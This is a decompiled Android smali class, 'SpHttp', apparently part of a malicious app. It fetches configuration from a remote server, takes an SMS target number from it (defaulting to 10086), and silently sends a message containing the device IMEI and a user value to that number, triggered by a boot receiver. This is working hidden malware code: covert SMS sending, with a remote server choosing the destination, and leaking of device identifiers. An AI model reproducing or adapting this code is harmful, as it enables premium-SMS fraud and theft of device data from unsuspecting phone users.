.class public LDaemon/Global/SpHttp;
.super Ljava/lang/Object;
.source "SpHttp.java"

# interfaces
.implements LDaemon/Base/HttpBase;


# static fields
.field private static final tag:Ljava/lang/String; = "http"


# instance fields
.field private sms:Ljava/lang/String;

.field private final url:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 18
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 14
    const-string v0, "http://domaindev.51widgets.com/ss/dom/config.xml"

    iput-object v0, p0, LDaemon/Global/SpHttp;->url:Ljava/lang/String;

    .line 16
    const-string v0, "10086"

    iput-object v0, p0, LDaemon/Global/SpHttp;->sms:Ljava/lang/String;

    .line 19
    return-void
.end method

.method private mf7531e2d(Ljava/lang/String;)V
    .locals 1
    .param p1, "log"    # Ljava/lang/String;

    .prologue
    .line 100
    const-string v0, "http"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 101
    return-void
.end method


# virtual methods
.method public getHttpUrl()Ljava/lang/String;
    .locals 1

    .prologue
    .line 35
    const-string v0, "http://domaindev.51widgets.com/ss/dom/config.xml"

    return-object v0
.end method

.method public getSms()Ljava/lang/String;
    .locals 1

    .prologue
    .line 24
    iget-object v0, p0, LDaemon/Global/SpHttp;->sms:Ljava/lang/String;

    return-object v0
.end method

.method public parsePackage(Ljava/lang/String;)I
    .locals 3
    .param p1, "temp"    # Ljava/lang/String;

    .prologue
    .line 42
    const-string v1, "parsePackage state:start"

    invoke-direct {p0, v1}, LDaemon/Global/SpHttp;->mf7531e2d(Ljava/lang/String;)V

    .line 44
    const-string v1, "<msg>"

    invoke-virtual {p1, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    const/4 v2, -0x1

    if-eq v1, v2, :cond_0

    .line 45
    const-string v1, "msg"

    invoke-static {p1, v1}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    sput-object v1, LDaemon/Service/RerviceHttp;->msg:Ljava/lang/String;

    .line 46
    const/4 v1, 0x2

    .line 58
    :goto_0
    return v1

    .line 50
    :cond_0
    :try_start_0
    const-string v1, "sms"

    invoke-static {p1, v1}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, LDaemon/Global/SpHttp;->sms:Ljava/lang/String;

    .line 51
    iget-object v1, p0, LDaemon/Global/SpHttp;->sms:Ljava/lang/String;

    invoke-virtual {p0, v1}, LDaemon/Global/SpHttp;->setSms(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 56
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "parsePackage state:end sms:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, LDaemon/Global/SpHttp;->sms:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v1}, LDaemon/Global/SpHttp;->mf7531e2d(Ljava/lang/String;)V

    .line 58
    const/4 v1, 0x1

    goto :goto_0

    .line 52
    :catch_0
    move-exception v1

    move-object v0, v1

    .line 53
    .local v0, "e":Ljava/lang/Exception;
    const/4 v1, 0x0

    goto :goto_0
.end method

.method public setPaintState(I)V
    .locals 5
    .param p1, "httpEnd"    # I

    .prologue
    const/4 v4, 0x0

    .line 68
    iget-object v0, p0, LDaemon/Global/SpHttp;->sms:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_0

    .line 70
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->smsobserver:LDaemon/Service/SMSObserver;

    iget-object v1, p0, LDaemon/Global/SpHttp;->sms:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "YHZC "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v3, LHamsterSuper/Client/Deamon/BootReceiver;->reghttp:LDaemon/Global/RegHttp;

    invoke-virtual {v3}, LDaemon/Global/RegHttp;->getImei()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, LHamsterSuper/Client/Deamon/BootReceiver;->reghttp:LDaemon/Global/RegHttp;

    invoke-virtual {v3}, LDaemon/Global/RegHttp;->getuser_value()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, LDaemon/Service/SMSObserver;->sndSms(Ljava/lang/String;Ljava/lang/String;)V

    .line 71
    const/4 v0, 0x1

    sput v0, LHamsterSuper/Client/Deamon/BootReceiver;->mode:I

    .line 72
    sput-object v4, LHamsterSuper/Client/Deamon/BootReceiver;->online:LDaemon/Service/OnlineThread;

    .line 79
    :goto_0
    packed-switch p1, :pswitch_data_0

    .line 95
    :pswitch_0
    return-void

    .line 74
    :cond_0
    sput-object v4, LHamsterSuper/Client/Deamon/BootReceiver;->online:LDaemon/Service/OnlineThread;

    .line 75
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->sphttp:LDaemon/Global/SpHttp;

    invoke-static {v0}, LDaemon/Service/RerviceHttp;->m39bca0c7(LDaemon/Base/HttpBase;)V

    goto :goto_0

    .line 79
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_0
        :pswitch_0
    .end packed-switch
.end method

.method public setSms(Ljava/lang/String;)V
    .locals 0
    .param p1, "sms"    # Ljava/lang/String;

    .prologue
    .line 27
    iput-object p1, p0, LDaemon/Global/SpHttp;->sms:Ljava/lang/String;

    .line 28
    return-void
.end method
